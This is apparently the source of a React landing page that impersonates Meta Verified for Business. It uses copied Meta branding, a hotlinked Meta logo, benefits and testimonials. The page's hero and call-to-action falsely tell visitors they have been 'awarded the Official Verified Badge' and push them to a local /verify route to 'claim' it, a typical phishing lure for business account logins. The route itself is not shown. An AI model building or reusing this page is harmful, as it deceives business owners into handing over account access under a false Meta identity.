import { useState } from 'react';

export default function Home() {
  const [activeBenefit, setActiveBenefit] = useState(0);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [openFaq, setOpenFaq] = useState(null);

  const benefitsData = [
    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/images/benefit-1.webp' },
    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/images/benefit-2.webp' },
    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/images/benefit-3.webp' },
    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/images/benefit-4.webp' }
  ];

  const testimonials = [
    { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
    { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' },
    { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
  ];

  const faqs = [
    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' },
    { q: 'What if I already have a verified badge?', a: 'No action is needed to keep your badge.' },
    { q: 'What if I\'m interested in Meta Verified for creators?', a: 'Visit the Meta Verified for creators page to learn more.' },
    { q: 'Where will my badge appear?', a: 'Facebook Page and Messenger account, or Instagram account and Threads, depending on the asset you select.' },
    { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
  ];

  return (
    <div style={{ overflowX: 'hidden' }}>
      <header className="header">
          <div className="header-left">
              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
              <nav className="nav-links">
                  <a className="nav-link" href="#steps">Get started</a>
                  <a className="nav-link" href="#benefits">Advertise</a>
                  <a className="nav-link" href="#faq">Learn</a>
                  <a className="nav-link" href="#footer">Support</a>
              </nav>
          </div>
          <div className="header-right">
              <svg className="header-icon" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" strokeLinecap="round"/></svg>
              <div className="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
          </div>
      </header>

      <section id="hero">
          <div className="hero-inner">
              <div className="hero-text">
                  <div className="hero-text-inner">
                      <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                      <a href="/verify" className="btn-primary" style={{display: 'inline-block', textDecoration: 'none'}}>Claim your badge</a>
                      <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                  </div>
              </div>
              <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified for Business" /></div>
          </div>
      </section>

      <section className="benefits" id="benefits">
          <div className="benefits-header">
              <h2>Explore Meta Verified for business benefits.</h2>
              <p>Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.</p>
              <span className="benefits-learn-more" onClick={() => document.getElementById('faq').scrollIntoView({behavior:'smooth'})}>
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5"/><path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>Learn more
              </span>
          </div>
          <div className="benefits-grid">
              <div className="benefits-image"><img src={benefitsData[activeBenefit].image} alt="Benefit" /></div>
              <div className="benefits-accordion">
                  {benefitsData.map((b, i) => (
                      <div key={i} className={`benefit-item ${i === activeBenefit ? 'active' : ''}`} onClick={() => setActiveBenefit(i)}>
                          <div className="benefit-header"><span>{b.title}</span><svg className={`benefit-chevron ${i === activeBenefit ? 'rotated' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></div>
                          <div className={`benefit-desc ${i === activeBenefit ? 'open' : ''}`}><p>{b.desc}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <section className="steps" id="steps">
          <div className="steps-inner">
              <h2>Sign up for Meta Verified.</h2>
              <p>Our verification process is designed to maintain the integrity of the verified badge for businesses. Get started by submitting an application.</p>
              <div className="steps-grid">
                  <div className="step-card"><div className="step-number">1</div><div className="step-title">Start your application.</div><p className="step-desc">Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements. When getting started, you should have your business contact information ready.</p></div>
                  <div className="step-card"><div className="step-number">2</div><div className="step-title">Verify business details.</div><p className="step-desc">You may be asked to share details such as your business name, address, website and/or phone number.</p></div>
                  <div className="step-card"><div className="step-number">3</div><div className="step-title">Get reviewed.</div><p className="step-desc">We'll review your application and send an update on your status within three business days.</p></div>
              </div>
          </div>
      </section>

      <section className="testimonials">
          <div className="container-narrow">
              <h2>See how Meta Verified has helped real businesses.</h2>
              <div className="carousel-wrapper">
                  <div className="carousel-track" style={{ transform: `translateX(-${currentSlide * 100}%)` }}>
                      {testimonials.map((t, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{t.quote}</p><p className="carousel-author">{t.author}</p></div>))}
                  </div>
              </div>
              <div className="carousel-nav">
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev - 1 + testimonials.length) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7"/></svg></button>
                  <div className="carousel-dots">{testimonials.map((_, i) => (<div key={i} className={`dot ${i === currentSlide ? 'active' : ''}`} onClick={() => setCurrentSlide(i)}></div>))}</div>
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev + 1) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7"/></svg></button>
              </div>
          </div>
      </section>

      <section className="cta">
          <div className="cta-inner">
              <div className="cta-content">
                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                  <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
                  <a href="/verify" className="btn-primary" style={{display: 'inline-block', textDecoration: 'none'}}>Claim your badge</a>
              </div>
              <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="faq" id="faq">
          <div className="faq-inner">
              <h2>Frequently asked questions</h2>
              <p className="faq-sub">For more, visit our Help Centre.</p>
              <div className="faq-list">
                  {faqs.map((f, i) => (
                      <div key={i} className="faq-item">
                          <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}><span>{f.q}</span><svg className={`faq-chevron ${openFaq === i ? 'open' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></button>
                          <div className={`faq-answer ${openFaq === i ? 'open' : ''}`}><p>{f.a}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <footer className="footer" id="footer">
          <div className="footer-inner">
              <div className="footer-newsletter">
                  <div className="footer-row">
                      <div style={{ maxWidth: '480px' }}><div className="footer-title">Get the latest updates from Meta for Business.</div><p className="footer-desc">Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.</p></div>
                      <div className="footer-form"><input type="email" className="footer-input" placeholder="Your email address" /><button className="footer-subscribe">Subscribe</button></div>
                  </div>
                  <p className="footer-consent">By submitting this form, you agree to receive marketing-related electronic communications from Meta. You may withdraw your consent and unsubscribe at any time.</p>
              </div>
              <div className="footer-bottom">
                  <span className="footer-copy">© 2026 Meta</span>
                  <div className="footer-grid">
                      <div><a href="#hero" className="footer-link">About</a></div><div><a href="#steps" className="footer-link">Developers</a></div><div><a href="#benefits" className="footer-link">Careers</a></div><div><a href="#faq" className="footer-link">Privacy</a></div><div><a href="#faq" className="footer-link">Cookies</a></div><div><a href="#faq" className="footer-link">Terms</a></div>
                  </div>
              </div>
          </div>
      </footer>
    </div>
  );
}